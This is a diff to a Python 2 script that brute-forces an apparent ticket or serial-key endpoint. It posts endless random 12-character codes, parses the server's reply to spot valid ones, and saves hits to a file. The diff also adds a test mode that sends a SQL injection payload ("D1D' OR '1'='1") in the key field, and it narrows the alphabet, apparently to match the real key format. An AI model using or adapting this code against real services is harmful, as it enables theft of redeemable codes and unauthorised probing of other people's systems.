@@ -41,37 +41,56 @@ def try_code(num):
   handler = urllib2.HTTPHandler()
   opener.add_handler(handler)
   req = urllib2.Request(_url)
-  data = 'action=pcticket&SNkey='+num
+  # data = 'action=pcticket&SNkey='+num
   for (name, val) in _header.items():
     req.add_header(name, val)
-  req.add_data(data)
+  req.add_data(num)
+  req.add_header('Content-Length', str(len(num)))
   try:
     response = opener.open(req)
   except:
     # print '10060 error, sleep 10 second'
+    opener.close()
     print 'sleep'
-    time.sleep(10)
-    return '0'
+    time.sleep(1)
+    return '00'
   content = response.read()
   bs_page =  BeautifulSoup(gzdecode(content))
-  # print bs_page.contents[0]
-  return bs_page.contents[0][11]
+  # print bs_page
+  opener.close()
+  return bs_page.find('p').contents[0][11]+bs_page.find('p').contents[0][24]
 
 def code_write(fp, num):
   fp.writelines(num)
+  fp.writelines('\n')
 
+# _test = True
+_test = False
 def main():
   _file = open(_file_name, 'a')
+  if _test:
+    code = "D1D' OR '1'='1"
+    data = {'action':'pcticket',
+            'SNkey':code}
+    # data = urllib.urlencode(data)
+    data = 'action=pcticket&SNkey='+code
+    print data
+    try_code(data)
+    return
   while True:
     code = ''
     for i in range(1, 13):
-      a = random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
+      # a = random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
+      a = random.choice('23456789ABCDEFGHJKLMNPQRSTUVWXYZ')
       code = code + a
     print 'try ->>>>>>>>>>>>>>>>>>>>>>>'+code
-    d = try_code(code)
-    # d = '0'
+    data = {'action':'pcticket',
+            'SNkey':code}
+    data = urllib.urlencode(data)
+    d = try_code(data)
+    print d
     # print code+'-------------------->'+d
-    if d == '0':
+    if d == '00':
       continue
       break
     else:
